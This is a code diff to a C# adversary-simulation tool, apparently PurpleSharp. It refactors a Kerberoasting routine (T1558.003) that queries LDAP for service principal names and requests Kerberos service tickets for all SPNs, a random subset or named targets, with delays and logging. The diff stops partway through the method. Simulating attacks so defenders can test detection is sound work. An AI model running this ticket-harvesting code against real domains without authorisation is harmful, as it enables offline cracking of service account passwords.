@@ -123,27 +123,58 @@ namespace PurpleSharp.Simulations
             }
         }
         
-        public static void Kerberoasting(string log, int sleep)
+        public static void Kerberoasting(PlaybookTask playbook_task, string log)
         {
             string currentPath = AppDomain.CurrentDomain.BaseDirectory;
-            Lib.Logger logger = new Lib.Logger(currentPath + log);
+            Logger logger = new Logger(currentPath + log);
             logger.SimulationHeader("T1558.003");
+            List<String> servicePrincipalNames;
 
-
-            if (sleep > 0) logger.TimestampInfo(String.Format("Sleeping {0} seconds between each service ticket request", sleep));
+            if (playbook_task.task_sleep > 0) logger.TimestampInfo(String.Format("Sleeping {0} seconds between each service ticket request", playbook_task.task_sleep));
 
             try
             {
-                //NetworkCredential cred = null;
-                List<String> spns;
-                spns = Ldap.GetSPNs();
+                logger.TimestampInfo(String.Format("Querying LDAP for Service Principal Names..."));
+                servicePrincipalNames = Ldap.GetSPNs();
+                logger.TimestampInfo(String.Format("Found {0} SPNs", servicePrincipalNames.Count));
 
-                foreach (String spn in spns)
+
+                if (playbook_task.variation == 1)
                 {
-                    Lib.SharpRoast.GetDomainSPNTicket(spn.Split('#')[0], spn.Split('#')[1], "", "", logger);
-                    if (sleep > 0) Thread.Sleep(sleep * 1000);
+                    logger.TimestampInfo(String.Format("Requesting a service ticket for all the {0} identified SPNs", servicePrincipalNames.Count));
+                    foreach (String spn in servicePrincipalNames)
+                    {
+                        SharpRoast.GetDomainSPNTicket(spn.Split('#')[0], spn.Split('#')[1], "", "", logger);
+                        if (playbook_task.task_sleep > 0) Thread.Sleep(playbook_task.task_sleep * 1000);
+                    }
+                    logger.SimulationFinished();
+
                 }
-                logger.SimulationFinished();
+                else if (playbook_task.variation == 2)
+                {
+                    var random = new Random();
+                    logger.TimestampInfo(String.Format("Requesting a service ticket for {0} random SPNs", playbook_task.user_target_total));
+
+                    for (int i = 0; i< playbook_task.user_target_total;i++)
+                    {
+                        int index = random.Next(servicePrincipalNames.Count);
+                        SharpRoast.GetDomainSPNTicket(servicePrincipalNames[index].Split('#')[0], servicePrincipalNames[index].Split('#')[1], "", "", logger);
+                        if (playbook_task.task_sleep > 0) Thread.Sleep(playbook_task.task_sleep * 1000);
+                    }
+                    logger.SimulationFinished();
+                }
+                else if (playbook_task.variation == 3)
+                {
+                    var random = new Random();
+                    logger.TimestampInfo(String.Format("Requesting a service ticket for {0} defined SPNs", playbook_task.user_targets.Length));
+
+                    foreach ( string spn in playbook_task.user_targets)
+                    {
+                        SharpRoast.GetDomainSPNTicket(spn.Split('#')[0], spn.Split('#')[1], "", "", logger);
+                        if (playbook_task.task_sleep > 0) Thread.Sleep(playbook_task.task_sleep * 1000);
+                    }
+                    logger.SimulationFinished();
+                }
 
             }
             catch (Exception ex)
